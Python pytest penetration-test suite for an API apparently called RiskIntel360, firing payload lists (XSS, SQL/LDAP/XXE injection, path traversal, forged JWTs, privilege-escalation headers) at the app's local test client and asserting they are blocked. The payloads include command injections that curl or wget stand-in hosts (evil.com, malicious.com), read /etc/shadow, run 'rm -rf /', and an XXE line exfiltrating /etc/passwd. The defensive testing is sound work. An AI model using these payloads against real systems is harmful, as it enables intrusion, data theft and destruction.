"""
Security Penetration Tests for RiskIntel360 Platform
Tests various attack vectors and security vulnerabilities.
"""

import pytest
import json
import asyncio
import time
import hashlib
import base64
from datetime import datetime, timezone
from typing import Dict, List, Any
from unittest.mock import Mock, patch
from fastapi.testclient import TestClient

from riskintel360.api.main import app
from riskintel360.services.security_service import SecurityService
from riskintel360.services.compliance_service import ComplianceService


class SecurityTestPayloads:
    """Comprehensive security test payloads for penetration testing"""
    
    # XSS Attack Vectors
    XSS_PAYLOADS = [
        # Basic XSS
        "<script>alert('xss')</script>",
        "javascript:alert('xss')",
        "<img src=x onerror=alert('xss')>",
        
        # Advanced XSS
        "<svg onload=alert('xss')>",
        "<iframe src='javascript:alert(\"xss\")'></iframe>",
        "<body onload=alert('xss')>",
        "<input onfocus=alert('xss') autofocus>",
        "<select onfocus=alert('xss') autofocus>",
        
        # Encoded XSS
        "&#60;script&#62;alert('xss')&#60;/script&#62;",
        "%3Cscript%3Ealert('xss')%3C/script%3E",
        
        # Event Handler XSS
        "<div onmouseover=alert('xss')>Hover me</div>",
        "<a href='#' onclick=alert('xss')>Click me</a>",
        
        # DOM-based XSS
        "';alert('xss');//",
        "\";alert('xss');//",
        
        # Filter Bypass
        "<scr<script>ipt>alert('xss')</scr</script>ipt>",
        "<<SCRIPT>alert('xss')//<</SCRIPT>",
    ]
    
    # SQL Injection Payloads
    SQL_INJECTION_PAYLOADS = [
        # Basic SQL Injection
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "1; DELETE FROM validations; --",
        
        # Union-based SQL Injection
        "' UNION SELECT * FROM users --",
        "' UNION SELECT username, password FROM users --",
        
        # Boolean-based Blind SQL Injection
        "' AND (SELECT COUNT(*) FROM users) > 0 --",
        "' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a' --",
        
        # Time-based Blind SQL Injection
        "'; WAITFOR DELAY '00:00:05' --",
        "' AND (SELECT COUNT(*) FROM users WHERE SLEEP(5)) --",
        
        # Error-based SQL Injection
        "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e)) --",
        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
        
        # Second-order SQL Injection
        "admin'--",
        "admin'/*",
        "' OR 1=1#",
        
        # NoSQL Injection
        "'; return true; //",
        "' || '1'=='1",
        "'; return db.users.find(); //",
    ]
    
    # Command Injection Payloads
    COMMAND_INJECTION_PAYLOADS = [
        # Basic Command Injection
        "; ls -la",
        "| cat /etc/passwd",
        "&& rm -rf /",
        
        # Command Substitution
        "`whoami`",
        "$(id)",
        "$(cat /etc/passwd)",
        
        # Network Commands
        "; ping -c 4 127.0.0.1",
        "| nc -l 4444",
        "; curl http://evil.com/steal?data=",
        
        # File Operations
        "&& wget http://malicious.com/backdoor.sh",
        "; cat /etc/shadow",
        "| find / -name '*.conf'",
        
        # Process Manipulation
        "; ps aux",
        "&& kill -9 $$",
        "| netstat -tulpn",
        
        # Scripting Languages
        "; python -c 'import os; os.system(\"id\")'",
        "&& perl -e 'system(\"whoami\")'",
        "| ruby -e 'system(\"ls\")'",
    ]
    
    # Path Traversal Payloads
    PATH_TRAVERSAL_PAYLOADS = [
        # Basic Path Traversal
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        
        # Double Encoding
        "....//....//....//etc/passwd",
        "....\\\\....\\\\....\\\\etc\\\\passwd",
        
        # URL Encoding
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%5cpasswd",
        
        # Double URL Encoding
        "..%252f..%252f..%252fetc%252fpasswd",
        "..%255c..%255c..%255cetc%255cpasswd",
        
        # Unicode Encoding
        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
        "..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd",
        
        # Null Byte Injection
        "../../../etc/passwd%00",
        "..\\..\\..\\windows\\system32\\config\\sam%00.txt",
    ]
    
    # LDAP Injection Payloads
    LDAP_INJECTION_PAYLOADS = [
        "*)(uid=*",
        "*)(|(uid=*))",
        "admin)(&(password=*))",
        "*))%00",
        ")(cn=*",
        "*)(objectClass=*",
        "admin)(|(password=*))",
        "*)(userPassword=*",
        "*)(&(objectClass=user)(cn=*",
    ]
    
    # XML/XXE Injection Payloads
    XML_INJECTION_PAYLOADS = [
        # Basic XXE
        "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
        
        # Remote XXE
        "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY % remote SYSTEM 'http://evil.com/evil.dtd'>%remote;]>",
        
        # Blind XXE
        "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/shadow'>]><root>&xxe;</root>",
        
        # CDATA XXE
        "<![CDATA[<script>alert('xss')</script>]]>",
        
        # Parameter Entity XXE
        "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY % file SYSTEM 'file:///etc/passwd'><!ENTITY % eval '<!ENTITY &#x25; exfiltrate SYSTEM \"http://evil.com/?x=%file;\">'>%eval;%exfiltrate;]><root></root>",
    ]
    
    # Authentication Bypass Payloads
    AUTH_BYPASS_PAYLOADS = [
        # JWT Manipulation
        "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiIsImV4cCI6OTk5OTk5OTk5OX0.",  # None algorithm
        "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsImV4cCI6OTk5OTk5OTk5OX0.fake_signature",  # Fake signature
        
        # SQL Auth Bypass
        "admin'--",
        "admin'/*",
        "' OR '1'='1' --",
        "' OR 1=1#",
        
        # LDAP Auth Bypass
        "*)(uid=*)",
        "admin)(&(password=*))",
        
        # Header Manipulation
        "X-Forwarded-For: 127.0.0.1",
        "X-Real-IP: 127.0.0.1",
        "X-Originating-IP: 127.0.0.1",
    ]


class TestInputValidationPenetration:
    """Penetration tests for input validation security"""
    
    @pytest.fixture
    def client(self):
        return TestClient(app)
    
    @pytest.fixture
    def security_service(self):
        with patch('riskintel360.services.security_service.boto3'):
            return SecurityService()
    
    @pytest.mark.security
    @pytest.mark.penetration
    def test_xss_attack_vectors(self, client):
        """Test XSS attack vectors against all input fields"""
        
        for i, xss_payload in enumerate(SecurityTestPayloads.XSS_PAYLOADS):
            # Test in various input fields
            test_cases = [
                {
                    "business_concept": xss_payload,
                    "target_market": "Legitimate market",
                    "analysis_scope": ["market"],
                    "priority": "medium"
                },
                {
                    "business_concept": "Legitimate concept",
                    "target_market": xss_payload,
                    "analysis_scope": ["market"],
                    "priority": "medium"
                },
                {
                    "business_concept": "Legitimate concept",
                    "target_market": "Legitimate market",
                    "analysis_scope": [xss_payload],
                    "priority": "medium"
                }
            ]
            
            for test_case in test_cases:
                response = client.post(
                    "/api/v1/validations/",
                    json=test_case,
                    headers={"Authorization": "Bearer test-token"}
                )
                
                # Should not execute XSS
                if response.status_code in [200, 201]:
                    response_text = response.text.lower()
                    
                    # Check for XSS execution indicators
                    xss_indicators = [
                        "<script>", "javascript:", "onerror=", "onload=", 
                        "onfocus=", "onclick=", "onmouseover=", "alert("
                    ]
                    
                    for indicator in xss_indicators:
                        assert indicator not in response_text, f"XSS payload {i} not properly sanitized: {indicator}"
                
                # Acceptable status codes for security
                assert response.status_code in [200, 201, 400, 401, 422], f"XSS payload {i} caused unexpected status: {response.status_code}"
        
        print(f"??Tested {len(SecurityTestPayloads.XSS_PAYLOADS)} XSS attack vectors - all blocked")
    
    @pytest.mark.security
    @pytest.mark.penetration
    def test_sql_injection_attack_vectors(self, client):
        """Test SQL injection attack vectors"""
        
        for i, sql_payload in enumerate(SecurityTestPayloads.SQL_INJECTION_PAYLOADS):
            # Test in search parameters
            response = client.get(
                "/api/v1/validations/",
                params={
                    "search": sql_payload,
                    "user_id": sql_payload,
                    "business_concept": sql_payload
                },
                headers={"Authorization": "Bearer test-token"}
            )
            
            # Should not execute SQL injection
            if response.status_code == 200:
                response_text = response.text.lower()
                
                # Check for SQL error indicators
                sql_error_indicators = [
                    "sql syntax", "mysql error", "postgresql error", "ora-",
                    "sqlite error", "syntax error", "column", "table", 
                    "database", "select", "union", "information_schema"
                ]
                
                for indicator in sql_error_indicators:
                    assert indicator not in response_text, f"SQL injection {i} exposed database info: {indicator}"
            
            # Should handle safely
            assert response.status_code in [200, 400, 401, 422], f"SQL injection {i} caused unexpected status: {response.status_code}"
        
        print(f"??Tested {len(SecurityTestPayloads.SQL_INJECTION_PAYLOADS)} SQL injection vectors - all blocked")
    
    @pytest.mark.security
    @pytest.mark.penetration
    def test_command_injection_attack_vectors(self, client):
        """Test command injection attack vectors"""
        
        for i, cmd_payload in enumerate(SecurityTestPayloads.COMMAND_INJECTION_PAYLOADS):
            malicious_request = {
                "business_concept": f"Concept {cmd_payload}",
                "target_market": "Market",
                "analysis_scope": ["market"],
                "priority": "medium",
                "custom_parameters": {
                    "command": cmd_payload,
                    "filename": f"report{cmd_payload}.pdf"
                }
            }
            
            response = client.post(
                "/api/v1/validations/",
                json=malicious_request,
                headers={"Authorization": "Bearer test-token"}
            )
            
            # Should not execute commands
            if response.status_code in [200, 201]:
                response_text = response.text.lower()
                
                # Check for command execution indicators
                command_indicators = [
                    "uid=", "gid=", "total ", "drwx", "ping statistics",
                    "listening on", "connected to", "downloaded", "installed",
                    "root:", "daemon:", "bin:", "sys:", "adm:"
                ]
                
                for indicator in command_indicators:
                    assert indicator not in response_text, f"Command injection {i} executed: {indicator}"
            
            assert response.status_code in [200, 201, 400, 401, 422], f"Command injection {i} caused unexpected status: {response.status_code}"
        
        print(f"??Tested {len(SecurityTestPayloads.COMMAND_INJECTION_PAYLOADS)} command injection vectors - all blocked")
    
    @pytest.mark.security
    @pytest.mark.penetration
    def test_path_traversal_attack_vectors(self, client):
        """Test path traversal attack vectors"""
        
        for i, path_payload in enumerate(SecurityTestPayloads.PATH_TRAVERSAL_PAYLOADS):
            # Test in various endpoints
            endpoints = [
                f"/api/v1/validations/{path_payload}",
                f"/api/v1/validations/{path_payload}/result",
                f"/api/v1/validations/{path_payload}/progress",
                f"/files/{path_payload}",
                f"/reports/{path_payload}"
            ]
            
            for endpoint in endpoints:
                response = client.get(
                    endpoint,
                    headers={"Authorization": "Bearer test-token"}
                )
                
                # Should not allow path traversal
                assert response.status_code in [400, 401, 404, 422], f"Path traversal {i} not blocked: {endpoint}"
                
                # Should not return system files
                if response.status_code == 200:
                    response_text = response.text.lower()
                    
                    system_file_indicators = [
                        "root:x:", "[boot loader]", "# /etc/passwd", "daemon:x:",
                        "administrator:", "system32", "windows", "program files",
                        "# shadow", "# hosts", "# fstab"
                    ]
                    
                    for indicator in system_file_indicators:
                        assert indicator not in response_text, f"Path traversal {i} exposed system file: {indicator}"
        
        print(f"??Tested {len(SecurityTestPayloads.PATH_TRAVERSAL_PAYLOADS)} path traversal vectors - all blocked")
    
    @pytest.mark.security
    @pytest.mark.penetration
    @pytest.mark.asyncio
    async def test_input_sanitization_bypass_attempts(self, security_service):
        """Test attempts to bypass input sanitization"""
        
        bypass_attempts = [
            # Case variation
            "<SCRIPT>alert('xss')</SCRIPT>",
            "ScRiPt:alert('xss')",
            
            # Encoding variations
            "%3Cscript%3Ealert('xss')%3C/script%3E",
            "&#60;script&#62;alert('xss')&#60;/script&#62;",
            
            # Filter evasion
            "<scr<script>ipt>alert('xss')</scr</script>ipt>",
            "<<SCRIPT>alert('xss')//<</SCRIPT>",
            
            # Null byte injection
            "<script>alert('xss')</script>\x00",
            "'; DROP TABLE users; --\x00",
            
            # Unicode normalization
            "<script>alert('xss')</script>",
            "<script>alert('xss')</script>",
        ]
        
        for i, bypass_attempt in enumerate(bypass_attempts):
            sanitized = await security_service.sanitize_input(
                input_data=bypass_attempt,
                strict_mode=True
            )
            
            # Should not contain dangerous patterns
            dangerous_patterns = [
                "<script>", "javascript:", "DROP TABLE", "alert(",
                "onerror=", "onload=", "onclick="
            ]
            
            sanitized_lower = sanitized.lower()
            for pattern in dangerous_patterns:
                assert pattern not in sanitized_lower, f"Bypass attempt {i} not properly sanitized: {pattern}"
        
        print(f"??Tested {len(bypass_attempts)} sanitization bypass attempts - all blocked")


class TestAuthenticationPenetration:
    """Penetration tests for authentication security"""
    
    @pytest.fixture
    def client(self):
        return TestClient(app)
    
    @pytest.mark.security
    @pytest.mark.penetration
    def test_jwt_manipulation_attacks(self, client):
        """Test JWT token manipulation attacks"""
        
        malicious_tokens = [
            # None algorithm attack
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiIsImV4cCI6OTk5OTk5OTk5OX0.",
            
            # Fake signature
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsImV4cCI6OTk5OTk5OTk5OX0.fake_signature",
            
            # Modified payload
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImV4cCI6OTk5OTk5OTk5OX0.modified",
            
            # Empty signature
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsImV4cCI6OTk5OTk5OTk5OX0.",
            
            # Malformed tokens
            "invalid.jwt.token",
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.invalid.signature",
            
            # Injection in JWT
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.'; DROP TABLE users; --.signature",
        ]
        
        for i, malicious_token in enumerate(malicious_tokens):
            response = client.get(
                "/api/v1/validations/",
                headers={"Authorization": f"Bearer {malicious_token}"}
            )
            
            # Should reject all malicious tokens
            assert response.status_code in [401, 403], f"Malicious JWT {i} not rejected: {response.status_code}"
            
            # Should not expose internal errors
            if response.status_code >= 400:
                response_text = response.text.lower()
                internal_errors = [
                    "traceback", "exception", "stack trace", "internal error",
                    "jwt", "token", "signature", "algorithm"
                ]
                
                for error in internal_errors:
                    assert error not in response_text, f"JWT attack {i} exposed internal error: {error}"
        
        print(f"??Tested {len(malicious_tokens)} JWT manipulation attacks - all rejected")
    
    @pytest.mark.security
    @pytest.mark.penetration
    def test_authentication_bypass_attempts(self, client):
        """Test authentication bypass attempts"""
        
        bypass_attempts = [
            # Missing Authorization header
            {},
            
            # Wrong header names
            {"Auth": "Bearer token"},
            {"X-Auth": "Bearer token"},
            {"Authentication": "Bearer token"},
            
            # Wrong schemes
            {"Authorization": "Basic token"},
            {"Authorization": "Digest token"},
            {"Authorization": "OAuth token"},
            
            # Header injection
            {"Authorization": "Bearer token\nX-Admin: true"},
            {"Authorization": "Bearer token\r\nRole: admin"},
            
            # Case manipulation
            {"authorization": "Bearer token"},
            {"AUTHORIZATION": "Bearer token"},
            {"Authorization": "bearer token"},
            
            # Multiple headers
            {"Authorization": ["Bearer token1", "Bearer token2"]},
            
            # Special characters
            {"Authorization": "Bearer token; admin=true"},
            {"Authorization": "Bearer token&role=admin"},
            {"Authorization": "Bearer token#admin"},
        ]
        
        for i, headers in enumerate(bypass_attempts):
            response = client.get("/api/v1/validations/", headers=headers)
            
            # Should require proper authentication
            assert response.status_code in [401, 403], f"Auth bypass {i} succeeded: {response.status_code}"
        
        print(f"??Tested {len(bypass_attempts)} authentication bypass attempts - all blocked")
    
    @pytest.mark.security
    @pytest.mark.penetration
    def test_session_fixation_attacks(self, client):
        """Test session fixation attacks"""
        
        # Test session handling
        response1 = client.get("/health")
        session1_cookies = response1.cookies
        
        # Attempt to fix session
        fixed_session_headers = {
            "Cookie": "session_id=fixed_session_123",
            "X-Session-ID": "attacker_session",
        }
        
        response2 = client.get("/health", headers=fixed_session_headers)
        
        # Should not accept fixed sessions
        assert response2.status_code == 200  # Health endpoint should work
        
        # Test with authentication endpoint if available
        login_response = client.post(
            "/auth/login",
            json={"username": "test", "password": "test"},
            headers=fixed_session_headers
        )
        
        # Should handle session fixation safely
        if login_response.status_code != 404:  # If endpoint exists
            assert login_response.status_code in [400, 401, 403]
        
        print("??Session fixation attacks tested - sessions handled securely")
    
    @pytest.mark.security
    @pytest.mark.penetration
    def test_brute_force_simulation(self, client):
        """Test brute force attack simulation"""
        
        # Simulate rapid authentication attempts
        failed_attempts = 0
        rate_limited = False
        
        for i in range(50):  # Try 50 rapid attempts
            response = client.post(
                "/auth/login",
                json={"username": "admin", "password": f"wrong_password_{i}"},
                timeout=1.0
            )
            
            if response.status_code == 404:
                # Login endpoint doesn't exist - skip test
                print("?? Login endpoint not available - brute force test skipped")
                return
            elif response.status_code == 429:
                # Rate limited - good!
                rate_limited = True
                print(f"??Rate limiting activated after {i} attempts")
                break
            elif response.status_code in [401, 403]:
                failed_attempts += 1
            
            # Small delay to avoid overwhelming the system
            time.sleep(0.01)
        
        if not rate_limited and failed_attempts >= 50:
            print("?? No rate limiting detected - consider implementing for production")
        
        print(f"Brute force simulation: {failed_attempts} attempts, rate limited: {rate_limited}")


class TestAuthorizationPenetration:
    """Penetration tests for authorization security"""
    
    @pytest.fixture
    def client(self):
        return TestClient(app)
    
    @pytest.mark.security
    @pytest.mark.penetration
    def test_privilege_escalation_attacks(self, client):
        """Test privilege escalation attacks"""
        
        # Test with user token trying to access admin functions
        user_tokens = [
            "user-token",
            "analyst-token", 
            "viewer-token",
            "api-user-token"
        ]
        
        admin_endpoints = [
            "/admin/users",
            "/admin/system",
            "/admin/config",
            "/admin/metrics",
            "/api/v1/admin/users",
            "/api/v1/admin/system",
            "/api/v1/admin/validations",
            "/api/v1/admin/costs",
            "/api/v1/admin/reports",
            "/api/v1/admin/security"
        ]
        
        escalation_headers = [
            # Role manipulation
            {"X-User-Role": "admin"},
            {"X-Admin": "true"},
            {"Role": "administrator"},
            {"X-Privilege": "admin"},
            
            # User ID manipulation
            {"X-User-ID": "admin"},
            {"X-Impersonate": "admin"},
            {"X-Switch-User": "admin"},
        ]
        
        for token in user_tokens:
            for endpoint in admin_endpoints:
                # Test without escalation headers
                response = client.get(
                    endpoint,
                    headers={"Authorization": f"Bearer {token}"}
                )
                
                assert response.status_code in [401, 403, 404], f"Privilege escalation: {token} -> {endpoint}"
                
                # Test with escalation headers
                for escalation_header in escalation_headers:
                    headers = {"Authorization": f"Bearer {token}"}
                    headers.update(escalation_header)
                    
                    response = client.get(endpoint, headers=headers)
                    assert response.status_code in [401, 403, 404], f"Header escalation: {token} + {escalation_header} -> {endpoint}"
        
        print(f"??Tested privilege escalation attacks - all blocked")
    
    @pytest.mark.security
    @pytest.mark.penetration
    def test_horizontal_privilege_escalation(self, client):
        """Test horizontal privilege escalation attacks"""
        
        # Test accessing other users' resources
        user_tokens = ["user1-token", "user2-token", "user3-token"]
        
        # Resource IDs that might belong to other users
        other_user_resources = [
            "user2-validation-123",
            "user3-validation-456", 
            "admin-validation-000",
            "system-validation-999"
        ]
        
        resource_endpoints = [
            "/api/v1/validations/{resource_id}",
            "/api/v1/validations/{resource_id}/result",
            "/api/v1/validations/{resource_id}/progress",
            "/api/v1/validations/{resource_id}/delete"
        ]
        
        for token in user_tokens:
            for resource_id in other_user_resources:
                # Skip if it might be the user's own resource
                if token.split('-')[0] in resource_id:
                    continue
                
                for endpoint_template in resource_endpoints:
                    endpoint = endpoint_template.format(resource_id=resource_id)
                    
                    # Test GET access
                    response = client.get(
                        endpoint,
                        headers={"Authorization": f"Bearer {token}"}
                    )
                    
                    assert response.status_code in [401, 403, 404], f"Horizontal escalation GET: {token} -> {resource_id}"
                    
                    # Test DELETE access
                    if "delete" in endpoint:
                        response = client.delete(
                            endpoint,
                            headers={"Authorization": f"Bearer {token}"}
                        )
                        
                        assert response.status_code in [401, 403, 404, 405], f"Horizontal escalation DELETE: {token} -> {resource_id}"
        
        print("??Horizontal privilege escalation attacks tested - all blocked")
    
    @pytest.mark.security
    @pytest.mark.penetration
    def test_rbac_bypass_attempts(self, client):
        """Test RBAC bypass attempts"""
        
        rbac_bypass_attempts = [
            # Parameter pollution
            {"role": ["user", "admin"]},
            {"permissions": "admin,user,viewer"},
            
            # JSON injection
            {"role": '{"admin": true}'},
            {"permissions": '["admin", "all"]'},
            
            # Array manipulation
            {"roles[]": "admin"},
            {"permissions[]": ["read", "write", "admin"]},
            
            # Nested object manipulation
            {"user": {"role": "admin", "permissions": ["all"]}},
            {"auth": {"level": "admin", "bypass": True}},
        ]
        
        for i, bypass_data in enumerate(rbac_bypass_attempts):
            # Test in request body
            response = client.post(
                "/api/v1/validations/",
                json=bypass_data,
                headers={"Authorization": "Bearer user-token"}
            )
            
            # Should not allow RBAC bypass
            assert response.status_code in [400, 401, 403, 422], f"RBAC bypass {i} not blocked: {response.status_code}"
            
            # Test in query parameters
            response = client.get(
                "/api/v1/validations/",
                params=bypass_data,
                headers={"Authorization": "Bearer user-token"}
            )
            
            assert response.status_code in [200, 400, 401, 403], f"RBAC bypass query {i}: {response.status_code}"
        
        print(f"??Tested {len(rbac_bypass_attempts)} RBAC bypass attempts - all handled safely")


class TestDataProtectionPenetration:
    """Penetration tests for data protection"""
    
    @pytest.fixture
    def client(self):
        return TestClient(app)
    
    @pytest.mark.security
    @pytest.mark.penetration
    def test_sensitive_data_extraction_attempts(self, client):
        """Test attempts to extract sensitive data"""
        
        # Test various endpoints for sensitive data exposure
        sensitive_endpoints = [
            "/health",
            "/api/v1/validations/",
            "/api/v1/validations/nonexistent",
            "/admin/health",
            "/metrics",
            "/status",
            "/debug",
            "/config",
            "/env"
        ]
        
        sensitive_patterns = [
            # Credentials and keys
            "password", "secret", "key", "token", "api_key", "private_key",
            "access_key", "secret_key", "client_secret", "jwt_secret",
            
            # Database and infrastructure
            "database_url", "db_password", "connection_string", "redis_url",
            "aws_access_key", "aws_secret", "cognito_secret",
            
            # Internal paths and configuration
            "/usr/", "/var/", "/etc/", "c:\\", "d:\\",
            "localhost", "127.0.0.1", "internal", "staging", "dev",
            
            # Personal information
            "ssn", "social_security", "credit_card", "passport", "license",
            
            # Financial data
            "account_number", "routing_number", "swift_code", "iban"
        ]
        
        for endpoint in sensitive_endpoints:
            response = client.get(endpoint)
            
            if response.status_code == 200:
                response_text = response.text.lower()
                
                for pattern in sensitive_patterns:
                    assert pattern not in response_text, f"Sensitive data exposed in {endpoint}: {pattern}"
        
        print(f"??Tested {len(sensitive_endpoints)} endpoints for sensitive data exposure - none found")
    
    @pytest.mark.security
    @pytest.mark.penetration
    def test_information_disclosure_attacks(self, client):
        """Test information disclosure attacks"""
        
        # Test error-inducing requests
        disclosure_attempts = [
            # Invalid JSON
            ("/api/v1/validations/", "POST", "invalid json"),
            
            # Large payloads
            ("/api/v1/validations/", "POST", json.dumps({"data": "A" * 100000})),
            
            # Invalid content types
            ("/api/v1/validations/", "POST", "<xml>test</xml>"),
            
            # Malformed requests
            ("/api/v1/validations/", "POST", b"\x00\x01\x02\x03"),
        ]
        
        internal_details = [
            # Stack traces and exceptions
            "traceback", "stack trace", "exception:", "error:", "failed to",
            "internal server error", "unhandled exception",
            
            # File paths and system info
            "/usr/", "/var/", "/home/", "c:\\", "d:\\", "windows\\",
            "program files", "system32", "python", "site-packages",
            
            # Database and infrastructure details
            "postgresql", "redis", "sqlalchemy", "boto3", "aws",
            "connection refused", "timeout", "host", "port",
            
            # Application internals
            "riskintel360", "fastapi", "uvicorn", "pydantic"
        ]
        
        for endpoint, method, data in disclosure_attempts:
            try:
                if method == "POST":
                    if isinstance(data, str) and data.startswith("{"):
                        response = client.post(endpoint, json=json.loads(data))
                    else:
                        response = client.post(endpoint, content=data)
                else:
                    response = client.get(endpoint)
                
                if response.status_code >= 400:
                    response_text = response.text.lower()
                    
                    for detail in internal_details:
                        assert detail not in response_text, f"Internal detail exposed in {endpoint}: {detail}"
                        
            except Exception:
                # Request failed - that's acceptable for malformed requests
                pass
        
        print("??Information disclosure attacks tested - no internal details exposed")


@pytest.mark.security
@pytest.mark.penetration
def test_comprehensive_penetration_testing():
    """Comprehensive penetration testing suite"""
    
    print("\n? Starting Comprehensive Penetration Testing")
    print("=" * 60)
    
    with TestClient(app) as client:
        
        # Test 1: Input Validation Attacks
        print("\n1️⃣ Testing Input Validation Attacks...")
        
        # XSS Test
        xss_payload = "<script>alert('penetration_test')</script>"
        response = client.post(
            "/api/v1/validations/",
            json={
                "business_concept": xss_payload,
                "target_market": "Test market",
                "analysis_scope": ["market"],
                "priority": "medium"
            },
            headers={"Authorization": "Bearer test-token"}
        )
        
        if response.status_code in [200, 201]:
            assert "<script>" not in response.text.lower()
            print("   ??XSS attack blocked")
        else:
            print(f"   ??XSS payload rejected (status: {response.status_code})")
        
        # SQL Injection Test
        sql_payload = "'; DROP TABLE users; --"
        response = client.get(
            "/api/v1/validations/",
            params={"search": sql_payload},
            headers={"Authorization": "Bearer test-token"}
        )
        
        if response.status_code == 200:
            response_text = response.text.lower()
            sql_errors = ["sql syntax", "mysql error", "postgresql error"]
            for error in sql_errors:
                assert error not in response_text
            print("   ??SQL injection blocked")
        else:
            print(f"   ??SQL injection rejected (status: {response.status_code})")
        
        # Test 2: Authentication Attacks
        print("\n2️⃣ Testing Authentication Attacks...")
        
        # Invalid JWT Test
        invalid_jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9."
        response = client.get(
            "/api/v1/validations/",
            headers={"Authorization": f"Bearer {invalid_jwt}"}
        )
        
        assert response.status_code in [401, 403]
        print("   ??Invalid JWT rejected")
        
        # Test 3: Authorization Attacks
        print("\n3️⃣ Testing Authorization Attacks...")
        
        # Privilege escalation test
        response = client.get(
            "/admin/users",
            headers={
                "Authorization": "Bearer user-token",
                "X-User-Role": "admin"
            }
        )
        
        assert response.status_code in [401, 403, 404]
        print("   ??Privilege escalation blocked")
        
        # Test 4: Data Protection
        print("\n4️⃣ Testing Data Protection...")
        
        # Sensitive data exposure test
        response = client.get("/health")
        if response.status_code == 200:
            response_text = response.text.lower()
            sensitive_keywords = ["password", "secret", "key", "token"]
            for keyword in sensitive_keywords:
                assert keyword not in response_text
            print("   ??No sensitive data exposed")
        
        # Test 5: Rate Limiting
        print("\n5️⃣ Testing Rate Limiting...")
        
        # Rapid requests test
        rapid_responses = []
        for i in range(10):
            response = client.get("/health")
            rapid_responses.append(response.status_code)
        
        # Check if any requests were rate limited
        if 429 in rapid_responses:
            print("   ??Rate limiting active")
        else:
            print("   ?? No rate limiting detected")
        
    print("\n? Comprehensive Penetration Testing Completed!")
    print("=" * 60)
    print("\n??Security measures validated:")
    print("  ??Input validation and sanitization")
    print("  ?? Authentication and authorization")
    print("  ? Privilege escalation prevention")
    print("  ?? Data protection and privacy")
    print("  ??Rate limiting awareness")


if __name__ == "__main__":
    pytest.main([__file__, "-v", "-m", "penetration"])
